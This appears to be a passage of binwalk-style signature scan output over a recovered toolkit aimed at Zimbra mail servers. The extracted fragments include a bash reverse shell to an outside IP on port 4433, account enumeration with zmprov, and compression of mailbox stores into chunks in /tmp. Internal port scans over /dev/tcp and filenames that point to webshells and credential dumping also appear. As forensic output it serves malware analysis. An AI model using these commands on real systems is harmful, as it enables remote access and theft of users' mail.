+686018        0xA77C2         Executable script, shebang: "/bin/bash"
+687198        0xA7C5E         Executable script, shebang: "/bin/bash"
+688700        0xA823C         Executable script, shebang: "/bin/bash"
+690197        0xA8815         Executable script, shebang: "/bin/bash"
+691793        0xA8E51         Executable script, shebang: "/bin/bash"
+693364        0xA9474         Executable script, shebang: "/bin/bash"
+694477        0xA98CD         Executable script, shebang: "/bin/bash"
+694810        0xA9A1A         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null); do
+694863        0xA9A4F         Unix path: /opt/zimbra/bin/zmmailbox -z -m "$a" gms 2>/dev/null)
+695211        0xA9BAB         Executable script, shebang: "/usr/bin/env python3"
+695213        0xA9BAD         Unix path: /usr/bin/env python3
+698538        0xAA8AA         Executable script, shebang: "/bin/bash"
+699977        0xAAE49         Executable script, shebang: "/bin/bash"
+702091        0xAB68B         Executable script, shebang: "/bin/bash"
+727041        0xB1801         Executable script, shebang: "/usr/bin/env python"
+727043        0xB1803         Unix path: /usr/bin/env python
+727082        0xB182A         Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+744388        0xB5BC4         Executable script, shebang: "/usr/bin/env python"
+744390        0xB5BC6         Unix path: /usr/bin/env python
+744429        0xB5BED         Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+761735        0xB9F87         Executable script, shebang: "/bin/bash"
+765255        0xBAD47         Executable script, shebang: "/usr/bin/env python3"
+765257        0xBAD49         Unix path: /usr/bin/env python3
+768362        0xBB96A         Executable script, shebang: "/bin/bash"
+768730        0xBBADA         Unix path: /opt/zimbra/common/bin/curl
+769277        0xBBCFD         Unix path: /dev/tcp/10.61.10.15/$p" 2>/dev/null && echo ".15:$p OPEN" >> "$O"; done
+769504        0xBBDE0         Unix path: /dev/tcp/10.61.10.216/$p" 2>/dev/null && echo ".216:$p OPEN" >> "$O"; done
+770820        0xBC304         Executable script, shebang: "/bin/bash"
+771208        0xBC488         Unix path: /opt/zimbra/bin
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/pfx4.b64
+MD5 Checksum:  b69730df827ccd87aa15a37dc0e0e4d4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/pldq80.sh
+MD5 Checksum:  c95bc367e57aefda6c6b30a27418c5f8
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+814           0x32E           Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/pldq.sh
+MD5 Checksum:  9ea850ac61094f7d92a774ebb295a9b7
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+824           0x338           Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/plx.sh
+MD5 Checksum:  ea41605730b08312f2b1a098a2b1edd3
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/pubwl2.py
+MD5 Checksum:  588f1f943ee8395c11bde3bd26f36c16
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/pubwl.py
+MD5 Checksum:  a05e60caa1e83c306c3548f7dfb66233
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/q80.sh
+MD5 Checksum:  6386342d10c28ee6fec90aa0fe07aea8
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+410           0x19A           Unix path: /opt/zimbra/log
+571           0x23B           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+703           0x2BF           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1065          0x429           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1244          0x4DC           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/q.sh
+MD5 Checksum:  f6b0bd31c7e13ed546dc5eb359192591
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+415           0x19F           Unix path: /opt/zimbra/log
+576           0x240           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+708           0x2C4           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1070          0x42E           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1249          0x4E1           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/rs.sh
+MD5 Checksum:  961690f6e7d4003ed1e27183c51138f5
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/samr2.py
+MD5 Checksum:  6fdb5446fdc37b21a593c9b66738cb26
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sd3.b64
+MD5 Checksum:  0935438f5a15a7d94e69e5cf1f68a88f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sd3.py
+MD5 Checksum:  94d45257cba01717722946189ea13e75
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python"
+2             0x2             Unix path: /usr/bin/env python
+41            0x29            Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sd3x.py
+MD5 Checksum:  94d45257cba01717722946189ea13e75
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python"
+2             0x2             Unix path: /usr/bin/env python
+41            0x29            Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secdump2.py
+MD5 Checksum:  94d45257cba01717722946189ea13e75
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python"
+2             0x2             Unix path: /usr/bin/env python
+41            0x29            Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun2.sh
+MD5 Checksum:  ced64e8a3d33aea14cc48ac109dd0456
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun3.sh
+MD5 Checksum:  521ebc7402daf99ff0c67782c39f2f9f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun4.sh
+MD5 Checksum:  b0804e00810fc21218ceefc87e3efb8a
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun5.sh
+MD5 Checksum:  eaf7d5af1db9460d8683440f095f143c
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun6.sh
+MD5 Checksum:  f78294b370b189c83441ff7e2d820102
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/secrun.sh
+MD5 Checksum:  f2fdec477df98cfe2cc871aa45bf18ab
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sizes.sh
+MD5 Checksum:  84608544e7fac1c2b907e7598ae47956
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+333           0x14D           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null); do
+386           0x182           Unix path: /opt/zimbra/bin/zmmailbox -z -m "$a" gms 2>/dev/null)
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/smb3.py
+MD5 Checksum:  969bc27518e2be930d63ede8889f5d27
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/smsweep.sh
+MD5 Checksum:  6460853ae87cc96ccf233d4caa27e999
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/statec2.sh
+MD5 Checksum:  cee9f982273e273f39795c3cfc0bdea2
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/statec.sh
+MD5 Checksum:  8f50d823fa60d509438b660e9517b42a
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sv3.b64
+MD5 Checksum:  f2ca92b30aae1a85d292662eca2978d6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/sv3.py
+MD5 Checksum:  346d7d2144f38bc34ab8f4f139294e16
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python"
+2             0x2             Unix path: /usr/bin/env python
+41            0x29            Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/svc.py
+MD5 Checksum:  346d7d2144f38bc34ab8f4f139294e16
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python"
+2             0x2             Unix path: /usr/bin/env python
+41            0x29            Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/vss1.sh
+MD5 Checksum:  5f00ced2f83b2bb2ee8a39d81e16e019
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/walk12.py
+MD5 Checksum:  2a4463578f655a1fc4d17f4a522d6411
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/webdeep.sh
+MD5 Checksum:  c54fe4590a8d7e371cf03d472f2304ad
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+368           0x170           Unix path: /opt/zimbra/common/bin/curl
+915           0x393           Unix path: /dev/tcp/10.61.10.15/$p" 2>/dev/null && echo ".15:$p OPEN" >> "$O"; done
+1142          0x476           Unix path: /dev/tcp/10.61.10.216/$p" 2>/dev/null && echo ".216:$p OPEN" >> "$O"; done
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/x.jsp
+MD5 Checksum:  de637abdf53be19e7394311b3c6ae194
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ys.jsp
+MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/zmcens.sh
+MD5 Checksum:  ba2752dd3e2e54e247aa8812010abcf8
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+388           0x184           Unix path: /opt/zimbra/bin
+
